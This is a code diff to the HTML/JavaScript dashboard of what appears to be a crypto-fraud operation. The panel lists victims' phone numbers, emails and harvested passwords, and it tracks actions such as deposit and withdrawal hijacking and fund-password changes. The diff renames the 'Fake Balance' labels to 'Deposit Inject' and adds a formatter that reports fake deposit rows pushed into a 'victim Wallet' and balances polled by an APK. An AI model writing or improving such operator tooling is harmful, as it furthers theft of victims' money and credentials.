@@ -353,7 +353,7 @@
     <button class="filter-btn" data-filter="change_fund_password" onclick="setFilter('change_fund_password',this)">Fund Pwd</button>
     <button class="filter-btn" data-filter="verify_fund_password" onclick="setFilter('verify_fund_password',this)">Withdraw</button>
     <button class="filter-btn" data-filter="deposit_hijack" onclick="setFilter('deposit_hijack',this)">Deposit Hijack</button>
-    <button class="filter-btn" data-filter="fake_balance_set" onclick="setFilter('fake_balance_set',this)">Fake Balance</button>
+    <button class="filter-btn" data-filter="fake_balance_set" onclick="setFilter('fake_balance_set',this)">Deposit Inject</button>
   </div>
 
   <p id="status"></p>
@@ -419,8 +419,8 @@
         manual_reset: 'Manual Reset',
         deposit_hijack: 'Deposit Hijack',
         withdraw_hijack: 'Withdraw Hijack',
-        fake_balance_set: 'Fake Balance Set',
-        fake_balance_get: 'Fake Balance Poll',
+        fake_balance_set: 'Deposit Inject',
+        fake_balance_get: 'Deposit Poll',
       };
       return map[a] || a || 'Unknown';
     }
@@ -447,6 +447,22 @@
           <div><div class="pwd-key">${esc(k)}</div><div class="pwd-val">${esc(v)}</div></div>
           <button class="copy-btn" onclick="copyText('${String(v).replace(/'/g,"\\'")}',this)">Copy</button>
         </div>`).join('');
+    }
+
+    function formatPayload(row) {
+      const a = row.action || (row.payload || {}).action || '';
+      const p = row.payload || {};
+      if (a === 'fake_balance_set') {
+        const deps = Array.isArray(p.deposits) ? p.deposits : [];
+        const amt = p.amount ?? row.amount ?? '-';
+        const coin = p.coin || 'USDT';
+        const chain = deps[0] && deps[0].chain ? deps[0].chain : 'TRC20';
+        return amt + ' ' + coin + ' (' + chain + ') — ' + deps.length + ' deposit row(s) → victim Wallet + 充值 Records';
+      }
+      if (a === 'fake_balance_get') {
+        return 'APK polled: ' + (p.amount ?? '-') + ' ' + (p.coin || 'USDT');
+      }
+      return JSON.stringify(p);
     }
 
     function buildPwdText(pwds) {
@@ -518,7 +534,7 @@
           <td>${esc(row.mobile||p.mobile||p.phone||'-')}</td>
           <td>${esc(row.email||p.email||'-')}</td>
           <td class="pwd">${buildPwdText(pwds)}</td>
-          <td><code style="font-size:11px">${esc(JSON.stringify(p))}</code></td>
+          <td><code style="font-size:11px">${esc(formatPayload(row))}</code></td>
         </tr>`;
       }).join('');
     }
